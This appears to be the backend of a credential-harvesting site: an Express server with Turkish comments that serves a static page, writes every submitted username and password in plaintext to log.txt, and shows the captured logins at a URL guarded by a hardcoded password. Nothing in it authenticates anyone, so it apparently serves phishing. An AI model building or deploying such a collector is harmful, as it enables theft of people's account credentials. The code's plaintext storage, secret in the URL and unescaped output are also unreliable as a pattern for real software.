const express = require("express");
const fs = require("fs");
const path = require("path");
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());

// Statik dosyaları sunmak için public klasörünü kullanın
app.use(express.static(path.join(__dirname, 'public')));

// Ana sayfa için route ekleyin
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Log kaydı için POST endpoint
app.post("/log", (req, res) => {
  const { username, password } = req.body;
  const timestamp = new Date().toLocaleString();
  const logEntry = `[${timestamp}] Username: ${username}, Password: ${password}\n`;
  fs.appendFileSync("log.txt", logEntry);
  res.sendStatus(200);
});

// Log dosyasını görüntülemek için güvenli endpoint
app.get("/viewlogs/:password", (req, res) => {
  const secretPassword = "159753"; // Bu şifreyi güvenli bir şifre ile değiştirin
  
  if (req.params.password === secretPassword) {
    try {
      const logData = fs.readFileSync("log.txt", "utf8");
      res.send(`<pre>${logData}</pre>`);
    } catch (error) {
      res.status(500).send("Log dosyası okunamadı: " + error.message);
    }
  } else {
    res.status(401).send("Yetkisiz erişim!");
  }
});

// Sunucuyu başlat
app.listen(PORT, () => console.log(`Log server running on ${PORT}`));
